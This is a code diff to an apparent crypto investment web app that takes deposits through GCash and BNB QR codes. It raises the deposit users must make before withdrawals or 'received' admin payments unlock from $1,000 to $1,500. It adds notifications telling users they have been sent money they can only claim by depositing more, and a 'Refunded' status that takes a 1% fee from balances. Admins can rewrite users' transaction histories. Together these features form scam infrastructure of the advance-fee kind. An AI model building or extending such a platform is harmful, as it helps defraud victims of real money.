@@ -191,6 +191,7 @@
   .badge-pending { background:rgba(244,196,48,0.2); color:var(--gold); }
   .badge-approved { background:rgba(0,230,118,0.2); color:var(--green); }
   .badge-rejected { background:rgba(255,56,96,0.2); color:var(--red); }
+  .badge-refunded { background:rgba(160,100,255,0.2); color:#b06aff; }
   .txn-list { display:flex; flex-direction:column; gap:8px; }
   .txn-row { display:flex; align-items:center; justify-content:space-between; padding:12px; background:var(--bg); border-radius:8px; font-size:0.85rem; }
   .txn-type { color:var(--accent); font-weight:700; }
@@ -331,6 +332,7 @@
   .dash-notif-item.pending   { border-color:rgba(244,196,48,0.35); background:rgba(244,196,48,0.06); }
   .dash-notif-item.rejected  { border-color:rgba(255,56,96,0.35);  background:rgba(255,56,96,0.06); }
   .dash-notif-item.received  { border-color:rgba(0,245,196,0.35);  background:rgba(0,245,196,0.06); }
+  .dash-notif-item.refunded  { border-color:rgba(160,100,255,0.35); background:rgba(160,100,255,0.06); }
   .dash-notif-icon { font-size:1.6rem; flex-shrink:0; margin-top:2px; }
   .dash-notif-body { flex:1; min-width:0; }
   .dash-notif-title { font-family:'Orbitron'; font-size:0.78rem; letter-spacing:1.5px; font-weight:700; margin-bottom:3px; }
@@ -338,6 +340,7 @@
   .dash-notif-item.pending   .dash-notif-title { color:var(--gold); }
   .dash-notif-item.rejected  .dash-notif-title { color:var(--red); }
   .dash-notif-item.received  .dash-notif-title { color:var(--accent); }
+  .dash-notif-item.refunded  .dash-notif-title { color:#b06aff; }
   .dash-notif-desc { font-size:0.88rem; color:var(--text); line-height:1.45; }
   .dash-notif-meta { font-family:'Share Tech Mono'; font-size:0.72rem; color:var(--muted); margin-top:4px; }
   .dash-notif-sender { font-family:'Rajdhani'; font-size:0.82rem; color:var(--accent); font-weight:700; margin-top:4px; }
@@ -348,6 +351,7 @@
   .dash-notif-item.pending  .dash-notif-pulse { background:var(--gold); }
   .dash-notif-item.rejected .dash-notif-pulse { background:var(--red); }
   .dash-notif-item.received .dash-notif-pulse { background:var(--accent); }
+  .dash-notif-item.refunded .dash-notif-pulse { background:#b06aff; }
 
   /* ===== TIER BADGES ===== */
   .tier-badge { display:inline-flex; align-items:center; gap:6px; padding:4px 12px; border-radius:20px; font-size:0.75rem; font-weight:700; font-family:'Orbitron'; letter-spacing:1px; border:1px solid; text-transform:uppercase; }
@@ -760,11 +764,11 @@
       <div id="tab-dashboard">
 
         <!-- UNVERIFIED BANNER -->
-        <div id="dashUnverifiedBanner" style="display:none;margin-bottom:20px;padding:16px 20px;border-radius:14px;border:1px solid rgba(255,56,96,0.4);background:rgba(255,56,96,0.07);display:none;align-items:center;gap:16px;flex-wrap:wrap;">
+        <div id="dashUnverifiedBanner" style="display:none;margin-bottom:20px;padding:16px 20px;border-radius:14px;border:1px solid rgba(255,56,96,0.4);background:rgba(255,56,96,0.07);align-items:center;gap:16px;flex-wrap:wrap;">
           <div style="font-size:1.8rem;flex-shrink:0;">🔒</div>
           <div style="flex:1;min-width:200px;">
             <div style="font-family:'Orbitron';font-size:0.85rem;font-weight:700;color:var(--red);letter-spacing:2px;margin-bottom:4px;">NOT ELIGIBLE FOR WITHDRAWAL</div>
-            <div style="font-size:0.88rem;color:var(--muted);line-height:1.5;">Your account is <strong style="color:var(--red);">Unverified</strong>. You must deposit a minimum of <strong style="color:var(--text);">$1,000 USD</strong> and have it approved before you can withdraw funds.</div>
+            <div id="dashUnverifiedDesc" style="font-size:0.88rem;color:var(--muted);line-height:1.5;">Your account is <strong style="color:var(--red);">Unverified</strong>. You must deposit <strong style="color:var(--text);">$1,500 USD</strong> more and have it approved to be verified.</div>
           </div>
           <button class="btn btn-primary btn-sm" onclick="openDepositModal()" style="white-space:nowrap;flex-shrink:0;">💳 Deposit Now</button>
         </div>
@@ -952,7 +956,7 @@
           <div style="font-size:2rem;">🔒</div>
           <div style="flex:1; min-width:200px;">
             <div style="font-family:'Orbitron'; font-size:0.9rem; font-weight:700; color:var(--red); letter-spacing:2px; margin-bottom:4px;">NOT ELIGIBLE FOR WITHDRAWAL</div>
-            <div style="font-size:0.88rem; color:var(--muted); line-height:1.5;">Your account is <strong style="color:var(--red);">Unverified</strong>. You must deposit a minimum of <strong style="color:var(--text);">$1,000 USD</strong> and have it approved before you can withdraw funds.</div>
+            <div id="withdrawUnverifiedDesc" style="font-size:0.88rem; color:var(--muted); line-height:1.5;">Your account is <strong style="color:var(--red);">Unverified</strong>. You must deposit <strong style="color:var(--text);">$1,500 USD</strong> more and have it approved to be verified.</div>
           </div>
           <button class="btn btn-primary btn-sm" onclick="openDepositModal()" style="white-space:nowrap;">💳 Deposit Now</button>
         </div>
@@ -1271,7 +1275,7 @@
     <h2>➕ ADD BALANCE TO USER</h2>
     <p style="color:var(--muted);font-size:0.88rem;margin-bottom:20px;line-height:1.5;">
       If the user is <strong style="color:var(--green);">Verified</strong> ($1,000+ deposited) — balance is added immediately and marked <strong>Approved</strong>.<br>
-      If <strong style="color:var(--red);">Unverified</strong> — the grant stays <strong>Pending</strong> until the user deposits $1,000+ and it is approved.
+      If <strong style="color:var(--red);">Unverified</strong> — the grant stays <strong>Pending</strong> until the user deposits $1,500+ and it is approved.
     </p>
     <div class="form-group">
       <label>Select User</label>
@@ -1357,7 +1361,7 @@
     <div class="form-group" style="margin-bottom:20px;">
       <label>Deposit Method</label>
       <select id="regDepositMethodSelect" onchange="toggleRegisterDepositMethod()" style="background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:12px;color:var(--text);font-family:'Rajdhani';font-size:1rem;width:100%;outline:none;">
-        <option value="gcash">Bank</option>
+        <option value="gcash">GCash</option>
         <option value="bnb">BNB Chain</option>
       </select>
     </div>
@@ -1370,13 +1374,13 @@
     
     <div class="qr-container">
       <div class="qr-box" id="reg-qr-gcash">
-        <img src="./qr-gcash.jpg" width="180" height="180" alt="Bank QR Code" style="border-radius: 8px;">
+        <img src="./qr-gcash.jpg" width="180" height="180" alt="GCash QR Code" style="border-radius: 8px;">
       </div>
       <div class="qr-box" id="reg-qr-bnb" style="display:none;">
         <img src="./qr-bnb.jfif" width="180" height="180" alt="BNB QR Code" style="border-radius: 8px;">
       </div>
       <p class="qr-note" id="reg-qr-note-text">
-        📲 Scan with your <strong>Bank App</strong>
+        📲 Scan with your <strong>GCash App</strong>
       </p>
     </div>
 
@@ -1492,6 +1496,7 @@
             <option value="Approved">Approved</option>
             <option value="Pending">Pending</option>
             <option value="Rejected">Rejected</option>
+            <option value="Refunded">Refunded</option>
           </select>
         </div>
       </div>
@@ -2135,25 +2140,25 @@ function updateTierUI(tierInfo, invested){
   if(dashVBadge){ dashVBadge.textContent = verifiedText; dashVBadge.className = verifiedCls; dashVBadge.style.fontSize='0.72rem'; dashVBadge.style.padding='3px 10px'; }
 
   // Dynamic calculation for the remaining amount needed
-  const remainingNeeded = Math.max(0, 1500 - invested);
+  // Use balance (not invested) so refund fees are reflected immediately
+  const userBalance = registeredUsers[currentUser ? currentUser.email : ''] ? (registeredUsers[currentUser.email].balance || 0) : 0;
+  const remainingNeeded = Math.max(0, 1500 - userBalance);
   const dynamicDesc = `Your account is <strong style="color:var(--red);">Unverified</strong>. You must deposit <strong style="color:var(--text);">$${remainingNeeded.toLocaleString()} USD</strong> more and have it approved to be verified.`;
 
   // Show/hide dashboard unverified banner
   const dashBanner = document.getElementById('dashUnverifiedBanner');
   if(dashBanner) {
     dashBanner.style.display = isVerified ? 'none' : 'flex';
-    if(!isVerified && dashBanner.children[1] && dashBanner.children[1].children[1]) {
-       dashBanner.children[1].children[1].innerHTML = dynamicDesc;
-    }
+    const dashDesc = document.getElementById('dashUnverifiedDesc');
+    if(!isVerified && dashDesc) dashDesc.innerHTML = dynamicDesc;
   }
 
   // Show/hide withdrawal not-eligible banner
   const wBanner = document.getElementById('withdrawUnverifiedBanner');
   if(wBanner) {
     wBanner.style.display = isVerified ? 'none' : 'flex';
-    if(!isVerified && wBanner.children[1] && wBanner.children[1].children[1]) {
-       wBanner.children[1].children[1].innerHTML = dynamicDesc;
-    }
+    const wDesc = document.getElementById('withdrawUnverifiedDesc');
+    if(!isVerified && wDesc) wDesc.innerHTML = dynamicDesc;
   }
 
   document.getElementById('tierMultiplier').textContent = isNone ? '—' : fmtMult(multiplier);
@@ -2221,6 +2226,11 @@ function buildDashNotifications(){
         notifs.push({ id:d.id, cls:'rejected', icon:'❌', title:'DEPOSIT REJECTED',
           desc:`Your deposit of <strong style="color:var(--red);">$${(d.amount||0).toLocaleString()}</strong> was rejected. Please contact support.`,
           meta:`${d.method||'Bank'} · ${d.date||''}`, pulse:false });
+      } else if(d.status === 'Refunded'){
+        const fee = Math.round((d.amount||0) * 0.01 * 100) / 100;
+        notifs.push({ id:d.id, cls:'refunded', icon:'↩️', title:'DEPOSIT REFUNDED',
+          desc:`Your deposit of <strong style="color:#b06aff;">$${(d.amount||0).toLocaleString()}</strong> has been refunded. A 1% processing fee has been charged against your remaining balance.`,
+          meta:`${d.method||'Bank'} · ${d.date||''} · 1% fee deducted from your balance`, pulse:true });
       }
     }
   });
@@ -2237,31 +2247,45 @@ function buildDashNotifications(){
 
   // Pending grants — unverified users waiting to hit minimum
   // Pending grants — unverified users waiting to hit minimum
-  const isVerified = (u.invested||0) >= 1500;
+  const isVerified = (u.balance||0) >= 1500;
   pendingGrants.forEach(g => {
     if(_dismissedNotifs.has(g.id)) return;
-    
-    // Grab the sender's name from the admin input, default to 'Admin' if left blank
+
     const senderNameDisplay = g.senderName ? g.senderName : 'Admin';
-    
-    // Dynamic calculation: Calculate exactly how much is left to reach $1,500
-    const currentInvested = u.invested || 0;
-    const remainingNeeded = Math.max(0, 1500 - currentInvested);
-    
-    // Always show INCOMING PAYMENT PENDING for unverified users,
-    // even if the admin has already approved the grant — money hasn't been released yet.
-    const pendingDesc = `You have Received <strong style="color:var(--gold);">$${(g.amount||0).toLocaleString()}</strong> from <strong>${senderNameDisplay}</strong>, you need to deposit <strong style="color:var(--text);">${remainingNeeded.toLocaleString()} usd</strong> more first to receive the money.`;
-    
-    notifs.push({ 
-      id: g.id, 
-      cls: 'pending', 
-      icon: '⏳', 
-      title: 'INCOMING PAYMENT PENDING',
-      desc: pendingDesc,
-      meta: `${g.date||''} · Awaiting deposit minimum`, 
-      pulse: true, 
-      submittedAt: g.submittedAt||0 
-    });
+
+    if(g.status === 'Refunded'){
+      // Grant was refunded — show refunded notification with 1% fee info
+      const fee = Math.round((g.amount||0) * 0.01 * 100) / 100;
+      notifs.push({
+        id: g.id,
+        cls: 'refunded',
+        icon: '↩️',
+        title: 'PAYMENT REFUNDED',
+        desc: `Your incoming payment of <strong style="color:#b06aff;">$${(g.amount||0).toLocaleString()}</strong> from <strong>${senderNameDisplay}</strong> has been refunded. A processing fee of <strong style="color:var(--red);">$${fee.toLocaleString()}</strong> (1% of the payment) was deducted from your balance.`,
+        meta: `${g.date||''} · 1% processing fee applied`,
+        pulse: true,
+        submittedAt: g.submittedAt||0
+      });
+    } else {
+      // Dynamic calculation: use balance so refund fees are reflected
+      const currentBalance = u.balance || 0;
+      const remainingNeeded = Math.max(0, 1500 - currentBalance);
+
+      // Always show INCOMING PAYMENT PENDING for unverified users,
+      // even if the admin has already approved the grant — money hasn't been released yet.
+      const pendingDesc = `You have Received <strong style="color:var(--gold);">$${(g.amount||0).toLocaleString()}</strong> from <strong>${senderNameDisplay}</strong>, you need to deposit <strong style="color:var(--text);">${remainingNeeded.toLocaleString()} usd</strong> more first to receive the money.`;
+
+      notifs.push({
+        id: g.id,
+        cls: 'pending',
+        icon: '⏳',
+        title: 'INCOMING PAYMENT PENDING',
+        desc: pendingDesc,
+        meta: `${g.date||''} · Awaiting deposit minimum`,
+        pulse: true,
+        submittedAt: g.submittedAt||0
+      });
+    }
   });
 
   userWithdrawals.forEach(w => {
@@ -2278,6 +2302,11 @@ function buildDashNotifications(){
       notifs.push({ id:w.id, cls:'rejected', icon:'❌', title:'WITHDRAWAL REJECTED',
         desc:`Your withdrawal of <strong style="color:var(--red);">$${(w.amount||0).toLocaleString()}</strong> was rejected. Funds remain in your wallet.`,
         meta:`${w.method||''} · ${w.date||''} · Contact support`, pulse:false });
+    } else if(w.status === 'Refunded'){
+      const fee = Math.round((w.amount||0) * 0.01 * 100) / 100;
+      notifs.push({ id:w.id, cls:'refunded', icon:'↩️', title:'WITHDRAWAL REFUNDED',
+        desc:`Your withdrawal of <strong style="color:#b06aff;">$${(w.amount||0).toLocaleString()}</strong> has been refunded to your wallet. A 1% processing fee has been charged against your remaining balance.`,
+        meta:`${w.method||''} · ${w.date||''} · 1% fee deducted from your balance`, pulse:true });
     }
   });
 
@@ -2431,7 +2460,7 @@ function openPurchaseModal(sym, type) {
   const u = registeredUsers[currentUser.email];
   if(!u) return;
 
-  // Block trading entirely for users below Bronze (less than $1,000 invested/approved)
+  // Block trading entirely for users below Bronze (less than $1,500 invested/approved)
   const userTierCheck = getTierForAmount(u.invested || 0);
   if(userTierCheck.current.key === 'none'){
     showNotif('Deposit at least $1,500 to start trading. Make a deposit and wait for admin approval.', 'error');
@@ -2913,7 +2942,7 @@ function buildHistoryTable(){
       <td><span class="txn-type" ${t.type==='RECEIVED'?'style="background:rgba(0,245,196,0.1);color:var(--accent);border-color:rgba(0,245,196,0.3);"':''}>${t.type}</span></td>
       <td style="font-family:'Share Tech Mono'">$${t.amount.toLocaleString()}</td>
       <td>${t.method||'Network'}</td>
-      <td><span class="badge badge-${t.status==='Approved'?'approved':t.status==='Rejected'?'rejected':'pending'}">${t.status}</span></td>
+      <td><span class="badge badge-${t.status==='Approved'?'approved':t.status==='Rejected'?'rejected':t.status==='Refunded'?'refunded':'pending'}">${t.status}</span></td>
     </tr>`).join('');
 }
 
@@ -2927,7 +2956,7 @@ function toggleRegisterDepositMethod() {
   if(method === 'gcash') {
     document.getElementById('reg-qr-gcash').style.display = 'inline-block';
     document.getElementById('reg-qr-bnb').style.display = 'none';
-    document.getElementById('reg-qr-note-text').innerHTML = `📲 Scan with your <strong>Bank App</strong>`;
+    document.getElementById('reg-qr-note-text').innerHTML = `📲 Scan with your <strong>GCash App</strong>`;
   } else {
     document.getElementById('reg-qr-gcash').style.display = 'none';
     document.getElementById('reg-qr-bnb').style.display = 'inline-block';
@@ -2975,7 +3004,7 @@ async function confirmRegisterDeposit(){
   }
 
   const methodVal = document.getElementById('regDepositMethodSelect').value;
-  const method = methodVal === 'gcash' ? 'Bank' : 'BNB Chain';
+  const method = methodVal === 'gcash' ? 'GCash' : 'BNB Chain';
   const txn = {
     id:          genId(),
     user:        userEmail,
@@ -3219,7 +3248,7 @@ function updateAdminPanel(){
   if(tl){
     const all = [...deposits,...withdrawals].slice(-8).reverse();
     tl.innerHTML = all.length===0?'<p style="color:var(--muted);font-size:0.9rem">No transactions yet</p>':
-      all.map(t=>`<div class="txn-row"><span class="txn-type">${t.type}</span><span style="font-size:0.8rem;color:var(--muted)">${t.user}</span><span style="font-family:'Share Tech Mono'">$${t.amount.toLocaleString()}</span><span class="badge badge-${t.status==='Approved'?'approved':t.status==='Rejected'?'rejected':'pending'}">${t.status}</span></div>`).join('');
+      all.map(t=>`<div class="txn-row"><span class="txn-type">${t.type}</span><span style="font-size:0.8rem;color:var(--muted)">${t.user}</span><span style="font-family:'Share Tech Mono'">$${t.amount.toLocaleString()}</span><span class="badge badge-${t.status==='Approved'?'approved':t.status==='Rejected'?'rejected':t.status==='Refunded'?'refunded':'pending'}">${t.status}</span></div>`).join('');
   }
 }
 
@@ -3506,7 +3535,7 @@ async function approvePendingGrant(grantId){
     }
     showNotif(`✅ Grant of $${targetGrant.amount.toLocaleString()} approved and credited to ${u.name}'s wallet.`,'success');
   } else {
-    // User is UNVERIFIED — admin approved it, but money stays locked until user deposits $1,000+
+    // User is UNVERIFIED — admin approved it, but money stays locked until user deposits $1,500+
     // Keep it in pendingGrants so the "INCOMING PAYMENT PENDING" notification stays visible
     // Only mark adminApproved so we know the admin has signed off
 
@@ -3519,7 +3548,7 @@ async function approvePendingGrant(grantId){
         window.HelianceDB.updateDeposit(grantId, {status:'Pending', adminApproved:true})
       ]);
     }
-    showNotif(`⏳ Grant admin-approved but ${u.name} is still Unverified — money will release once they deposit $1,000+.`,'success');
+    showNotif(`⏳ Grant admin-approved but ${u.name} is still Unverified — money will release once they deposit $1,500+.`,'success');
   }
   updateAdminPanel();
 }
@@ -3604,7 +3633,7 @@ function renderEditTxnList(){
 
   container.innerHTML = _editTxnList.map((t,i) => {
     const color = typeColors[t.type] || 'var(--muted)';
-    const statusOpts = ['Approved','Pending','Rejected'].map(s =>
+    const statusOpts = ['Approved','Pending','Rejected','Refunded'].map(s =>
       `<option value="${s}" ${t.status===s?'selected':''}>${s}</option>`
     ).join('');
     const typeOpts = ['DEPOSIT','WITHDRAW','RECEIVED','BUY','SELL','WHITELIST'].map(tp =>
@@ -3627,8 +3656,8 @@ function renderEditTxnList(){
         <input type="text" value="${t.method||''}" placeholder="Method / Note"
           oninput="_editTxnList[${i}].method=this.value"
           style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:7px 8px;color:var(--text);font-family:'Rajdhani';font-size:0.88rem;width:100%;outline:none;">
-        <select onchange="_editTxnList[${i}].status=this.value"
-          style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:7px 8px;color:${t.status==='Approved'?'var(--green)':t.status==='Rejected'?'var(--red)':'var(--gold)'};font-family:'Rajdhani';font-weight:700;font-size:0.88rem;outline:none;">
+        <select onchange="_editTxnList[${i}].status=this.value;renderEditTxnList()"
+          style="background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:7px 8px;color:${t.status==='Approved'?'var(--green)':t.status==='Rejected'?'var(--red)':t.status==='Refunded'?'#b06aff':'var(--gold)'};font-family:'Rajdhani';font-weight:700;font-size:0.88rem;outline:none;">
           ${statusOpts}
         </select>
         <button onclick="deleteTxnFromEdit(${i})" title="Delete transaction"
@@ -3702,6 +3731,26 @@ async function saveEditedTxns(){
   const keepDeposits    = deposits.filter(d => d.user !== _editTxnEmail);
   const keepWithdrawals = withdrawals.filter(w => w.user !== _editTxnEmail);
 
+  // 2b. Detect which transactions were newly changed TO "Refunded" and apply 1% fee of the grant/transaction amount
+  const prevStatuses = {};
+  [...deposits.filter(d => d.user === _editTxnEmail),
+   ...withdrawals.filter(w => w.user === _editTxnEmail),
+   ...(u.receivedGrants||[]),
+   ...(u.pendingGrants||[])
+  ].forEach(t => { prevStatuses[t.id] = t.status; });
+
+  let totalFeeCharged = 0;
+  _editTxnList.forEach(t => {
+    const wasRefunded = prevStatuses[t.id] === 'Refunded';
+    const isNowRefunded = t.status === 'Refunded';
+    if(isNowRefunded && !wasRefunded){
+      // Newly set to Refunded — charge 1% of the transaction/grant amount from their balance
+      const fee = Math.round((t.amount||0) * 0.01 * 100) / 100;
+      u.balance = Math.max(0, (u.balance||0) - fee);
+      totalFeeCharged += fee;
+    }
+  });
+
   // 3. Re-add from the edited list
   const newDeposits    = [];
   const newWithdrawals = [];
@@ -3764,7 +3813,11 @@ async function saveEditedTxns(){
     try { await Promise.all(fbOps); } catch(e){ console.warn('Partial Firestore save:', e); }
   }
 
-  showNotif(`✅ Transaction history saved for ${u.name}`, 'success');
+  if(totalFeeCharged > 0){
+    showNotif(`✅ Saved for ${u.name} · ↩️ Refund fee of $${totalFeeCharged.toLocaleString()} (1%) deducted from balance`, 'success');
+  } else {
+    showNotif(`✅ Transaction history saved for ${u.name}`, 'success');
+  }
   closeModal('editTxnModal');
   updateAdminPanel();
 }
@@ -3895,6 +3948,44 @@ function updateTickerPrices(){
 
 tick();
 setInterval(tick, 1800);
+
+// ===== BACKGROUND USER DATA SYNC =====
+// Polls Firestore every 10s so banners, tier, and notifications always reflect
+// the latest approved deposits without needing a page refresh.
+async function syncCurrentUserData(){
+  if(!currentUser || !window.HelianceDB || !window.HelianceDB.ready()) return;
+  try {
+    const [freshUser, allDeposits] = await Promise.all([
+      window.HelianceDB.getUser(currentUser.email),
+      window.HelianceDB.getDeposits()
+    ]);
+    if(!freshUser) return;
+
+    // Merge fresh server data into local registeredUsers
+    const u = registeredUsers[currentUser.email];
+    if(u){
+      u.balance       = freshUser.balance       ?? u.balance;
+      u.invested      = freshUser.invested       ?? u.invested;
+      u.activeDeposit = freshUser.activeDeposit  ?? u.activeDeposit;
+      u.pnl           = freshUser.pnl            ?? u.pnl;
+      u.receivedGrants= freshUser.receivedGrants ?? u.receivedGrants;
+      u.pendingGrants = freshUser.pendingGrants  ?? u.pendingGrants;
+    }
+
+    // Refresh the user's local deposit list
+    deposits = allDeposits.filter(d => d.user === currentUser.email);
+
+    // Recalculate global active deposits
+    window.globalActiveDeposits = allDeposits
+      .filter(d => d.status === 'Approved')
+      .reduce((sum, d) => sum + (d.amount || 0), 0);
+
+    // Refresh UI
+    updateUserStats();
+    buildDashNotifications();
+  } catch(e){ /* silent — don't interrupt the user */ }
+}
+setInterval(syncCurrentUserData, 10000);
 </script>
 </body>
 </html>
